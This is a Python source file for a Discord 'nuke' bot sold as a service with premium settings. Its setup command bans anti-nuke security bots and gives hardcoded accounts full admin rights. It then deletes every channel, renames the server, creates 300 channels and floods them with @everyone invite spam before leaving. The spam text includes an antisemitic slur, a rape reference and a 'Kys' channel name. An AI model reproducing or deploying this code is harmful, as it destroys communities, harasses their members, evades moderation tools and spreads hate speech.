# -*- coding: utf-8 -*-
import asyncio, base64, json, os, random, time
from datetime import datetime

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException, Forbidden
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
from discord.ui import Button, Select, View

from flask import Flask
import threading
intents = discord.Intents.all()

leaderboard_message = None
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"

PREM = 1525416750240366693
MOD_ROLE_ID = 1525416750240366693
WHITELIST = [1464634211406188721]
BLACKLISTED_GUILD_ID = 1525971260943892510
OWNER_ID = 1464634211406188721
LEADERBOARD_CHANNEL_ID = 1401931021544460389
TOKEN = os.getenv('TOKEN')
LOG_WEBHOOK_URL = ''

BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]

def save_nuke_stats(user_id, guild):
    try:
        with open(NUKE_STATS_FILE, "r") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id = str(user_id)
    guild_id = str(guild.id)

    stats["users"].setdefault(user_id, {"uses": 0})
    stats["users"][user_id]["uses"] += 1

    stats["servers"].setdefault(guild_id, {
        "user_id": user_id,
        "member_count": guild.member_count,
        "server_name": guild.name
    })

    with open(NUKE_STATS_FILE, "w") as f:
        json.dump(stats, f, indent=2)

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id):
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id, key, value):
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)

def get_show_username(user_id):
    return get_user_config(user_id).get("show_username", True)

def set_show_username(user_id, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id):
    return get_user_config(user_id).get("channel_name", "1week-King")

def set_channel_name(user_id, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id):
    return get_user_config(user_id).get("webhook_name", "larp-empire")

def set_webhook_name(user_id, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id):
    return get_user_config(user_id).get("webhook_message", "@everyone This sv has been officially closed https://discord.gg/larpempire")

def set_webhook_message(user_id, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id):
    return get_user_config(user_id).get("server_name", "1weeksober owns this")

def set_server_name(user_id, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id):
    return get_user_config(user_id).get("role_name", "1weeksober-on-top")

def set_role_name(user_id, value: str):
    set_user_config(user_id, "role_name", value)

class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)

# ================== FONTURI UNICODE ==================

FONT_MAPS = {
    "bold": {
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
        'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
        'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
        'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
        'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭'
    },
    "script": {
        'a': '𝒶', 'b': '𝒷', 'c': '𝒸', 'd': '𝒹', 'e': 'ℯ', 'f': '𝒻', 'g': 'ℊ', 'h': '𝒽', 'i': '𝒾', 'j': '𝒿',
        'k': '𝓀', 'l': '𝓁', 'm': '𝓂', 'n': '𝓃', 'o': 'ℴ', 'p': '𝓅', 'q': '𝓆', 'r': '𝓇', 's': '𝓈', 't': '𝓉',
        'u': '𝓊', 'v': '𝓋', 'w': '𝓌', 'x': '𝓍', 'y': '𝓎', 'z': '𝓏',
        'A': '𝒜', 'B': '𝐵', 'C': '𝒞', 'D': '𝒟', 'E': '𝐸', 'F': '𝐹', 'G': '𝒢', 'H': '𝐻', 'I': '𝐼', 'J': '𝒥',
        'K': '𝒦', 'L': '𝐿', 'M': '𝑀', 'N': '𝒩', 'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': '𝑅', 'S': '𝒮', 'T': '𝒯',
        'U': '𝒰', 'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵'
    },
    "double": {
        'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘', 'h': '𝕙', 'i': '𝕚', 'j': '𝕛',
        'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
        'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫',
        'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
        'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
        'U': '𝕌', 'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ'
    }
}

def apply_font(text, font_style):
    if not text:
        return text
    font_map = FONT_MAPS.get(font_style, {})
    result = []
    for char in text:
        if char in font_map:
            result.append(font_map[char])
        else:
            result.append(char)
    return ''.join(result)

async def detect_and_ban_antinuke_bots(guild):
    banned = []
    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                try:
                    await member.ban(reason="Anti-nuke bot detected")
                    banned.append(f"{bot_name} ({member.id})")
                except:
                    pass
    return banned

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

@bot.command(name="addpremium")
async def addpremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id not in premium_users:
        premium_users.append(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been granted premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} already has premium.")

@bot.command(name="removepremium")
async def removepremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id in premium_users:
        premium_users.remove(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been removed from premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} does not have premium.")

@bot.command()
async def setup(ctx):
    guild = ctx.guild
    user = ctx.author

    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ Botul nu are permisiunea de **Administrator**.")
        return

    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return

    if len(guild.members) < 2:
        await user.send(f"❌ Server `{guild.name}` needs at least 2 members. Leaving..")
        await guild.leave()
        return

    banned_bots = await detect_and_ban_antinuke_bots(guild)
    if banned_bots:
        await user.send(f"✅ Banați boturile: {', '.join(banned_bots)}")

    save_nuke_stats(user.id, guild)

    admin_users = [1389763251042258944, 1464634211406188721]

    try:
        admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
        for admin_id in admin_users:
            member = guild.get_member(admin_id)
            if member:
                await member.add_roles(admin_role)
    except:
        pass

    try:
        await guild.edit(name="1weeksober owns this")
    except:
        pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            continue

    # ===== LISTA NUME CANALE =====
    base_channel_names = [
        "1weeksober-king",
        "Cry-kid",
        "Larp-empire-on-top",
        "Ez-kid",
        "Get-r4ped",
        "Quit-beaming",
        "Kys",
        "1week-BOOM",
        "Ez-larp-on-top"
    ]

    # ===== EMBED =====
    embed_content = discord.Embed(
        title="**LARP EMPIRE N4KED YOUR AHH**",
        description=(
            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
            "**# LARP EMPIRE SERVER NON HOOKED**\n"
            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
            "https://discord.gg/larpempire\n\n"
            "*Next time don't give admin perms to everyone r4tard.*"
        ),
        color=0x000000
    )
    embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
    embed_content.set_footer(text="Larp Empire • Nuke Service")

    # ===== MESAJ MARE (maxim 2000 caractere) =====
    base_text = "@everyone @here join https://discord.gg/larpempire\n"
    repeat_count = 50
    big_message = (base_text * repeat_count)[:2000]

    # ===== CREARE 300 CANALE (batch de 20) =====
    total_channels = 300
    font_styles = ["bold", "script", "double"]
    created_channels = []

    await user.send(f"🔄 Încep crearea a {total_channels} de canale (batch 20)...")

    # Semafor pentru trimiterea celor 2 mesaje inițiale
    send_semaphore = asyncio.Semaphore(8)
    ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]

    async def send_initial_messages(channel):
        async with send_semaphore:
            try:
                await channel.send(embed=embed_content)
                await asyncio.sleep(0.1)
                ping_count = random.choice(ping_counts)
                ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                await channel.send(content=ping_message)
                await asyncio.sleep(0.1)
            except:
                pass

    async def create_channel(index):
        try:
            base_name = random.choice(base_channel_names)
            font_style = random.choice(font_styles)
            styled_name = apply_font(base_name, font_style)
            if len(styled_name) > 100:
                styled_name = base_name
            ch = await guild.create_text_channel(name=styled_name)
            created_channels.append(ch)
            await send_initial_messages(ch)
        except Exception as e:
            await user.send(f"⚠️ Eroare canal {index}: {e}")

    # Batch 20 cu pauză 0.3 secunde
    batch_size = 20
    pause_between_batches = 0.3

    for i in range(0, total_channels, batch_size):
        batch = [create_channel(i+j) for j in range(batch_size) if i+j < total_channels]
        await asyncio.gather(*batch)
        await asyncio.sleep(pause_between_batches)

    await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create!")

    # ===== SPAM FINAL PE TOATE CANALELE (până la rate limit) =====
    await user.send("🔄 Începe spam-ul final pe toate canalele...")

    spam_semaphore = asyncio.Semaphore(10)

    async def spam_final(channel):
        async with spam_semaphore:
            try:
                # Trimite mesajul mare
                await channel.send(content=big_message)
                await asyncio.sleep(0.1)
                # Trimite embed-ul
                await channel.send(embed=embed_content)
                await asyncio.sleep(0.1)
                # Continuă spam cu mesaje mai mici până la rate limit
                while True:
                    ping_count = random.randint(5, 12)
                    msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                    await channel.send(content=msg)
                    await asyncio.sleep(0.08)
            except discord.HTTPException as e:
                if e.status == 429:
                    # Rate limit atins pe acest canal – oprim spam-ul pe el
                    pass
                else:
                    raise
            except:
                pass

    # Lansează spam-ul final pe toate canalele în paralel
    spam_tasks = [spam_final(ch) for ch in created_channels]
    await asyncio.gather(*spam_tasks)

    await user.send("✅ Spam final complet. Părăsesc serverul...")

    try:
        await guild.create_role(name="1weeksober-on-top")
    except:
        pass

    await guild.leave()

class SettingsModal(discord.ui.Modal):
    def __init__(self, user_id: int):
        super().__init__(title="Configure your settings")
        self.user_id = user_id
        self.show_username_input = discord.ui.TextInput(
            label="Show username? (yes/no)",
            placeholder="yes or no",
            default="yes" if get_show_username(user_id) else "no",
            max_length=3
        )
        self.channel_name_input = discord.ui.TextInput(
            label="Channel Name (Premium required)",
            placeholder="1week-King",
            default=get_channel_name(user_id),
            max_length=32
        )
        self.webhook_name_input = discord.ui.TextInput(
            label="Webhook Name (Premium required)",
            placeholder="larp-empire",
            default=get_webhook_name(user_id),
            max_length=32
        )
        self.webhook_message_input = discord.ui.TextInput(
            label="Webhook Message (Premium required)",
            placeholder="This sv has been officially closed https://discord.gg/larpempire",
            default=get_webhook_message(user_id),
            max_length=100
        )
        self.server_name_input = discord.ui.TextInput(
            label="Server Name (Premium required)",
            placeholder="1weeksober owns this",
            default=get_server_name(user_id),
            max_length=32
        )
        self.add_item(self.show_username_input)
        self.add_item(self.channel_name_input)
        self.add_item(self.webhook_name_input)
        self.add_item(self.webhook_message_input)
        self.add_item(self.server_name_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id
        is_premium = is_premium_user(user_id)

        show_username_input = self.show_username_input.value.strip().lower()
        if show_username_input in ["yes", "no"]:
            set_show_username(user_id, show_username_input == "yes")

        def safe_set(key, value, default):
            if is_premium:
                set_user_config(user_id, key, value)
            else:
                set_user_config(user_id, key, default)

        safe_set("channel_name", self.channel_name_input.value.strip(), "1week-King")
        safe_set("webhook_name", self.webhook_name_input.value.strip(), "larp-empire")
        safe_set("webhook_message", self.webhook_message_input.value.strip(), "This sv has been officially closed https://discord.gg/larpempire")
        safe_set("server_name", self.server_name_input.value.strip(), "1weeksober owns this")

        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)

@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user}!")
    print(f"📊 Conectat la {len(bot.guilds)} servere.")
    await bot.tree.sync()

app = Flask(__name__)

@app.route("/")
def home():
    return "Corrupt bot is online."

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask).start()

bot.run(TOKEN)
